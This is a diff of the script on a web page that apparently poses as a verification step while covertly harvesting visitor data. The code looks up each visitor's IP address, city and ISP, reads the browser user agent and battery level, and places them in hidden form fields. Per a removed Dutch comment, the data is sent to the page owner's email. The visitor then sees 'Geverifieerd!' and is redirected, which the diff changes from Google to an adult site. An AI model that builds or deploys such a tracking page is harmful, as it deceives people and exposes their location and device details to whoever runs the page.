@@ -43,31 +43,31 @@
 </div>
 
 <script>
-    // 1. Haal uitgebreide IP en Locatie info op
+
     fetch('https://ipapi.co/json/')
         .then(res => res.json())
         .then(data => {
-            // Laat het zien op de pagina voor realisme
+            
             document.getElementById('ip-line').style.display = 'block';
             document.getElementById('loc-line').style.display = 'block';
             document.getElementById('user-ip').innerText = data.ip;
             document.getElementById('user-loc').innerText = data.city + ", " + data.country_name;
 
-            // Vul de verborgen formulier velden
+            
             document.getElementById('inIP').value = data.ip;
             document.getElementById('inCity').value = data.city;
             document.getElementById('inISP').value = data.org;
             document.getElementById('inDevice').value = navigator.userAgent;
         });
 
-    // 2. Batterij status toevoegen
+    
     if (navigator.getBattery) {
         navigator.getBattery().then(batt => {
             document.getElementById('inBatt').value = Math.round(batt.level * 100) + "%";
         });
     }
 
-    // 3. Versturen naar jouw e-mail
+    // 
     document.getElementById('trackerForm').addEventListener('submit', function(e) {
         e.preventDefault();
         const btn = document.getElementById('mainBtn');
@@ -80,7 +80,7 @@
             btn.style.backgroundColor = "#28a745";
             btn.innerText = "Geverifieerd!";
             setTimeout(() => {
-                window.location.href = "https://www.google.com";
+                window.location.href = "https://pornhub.com";
             }, 1000);
         });
     });
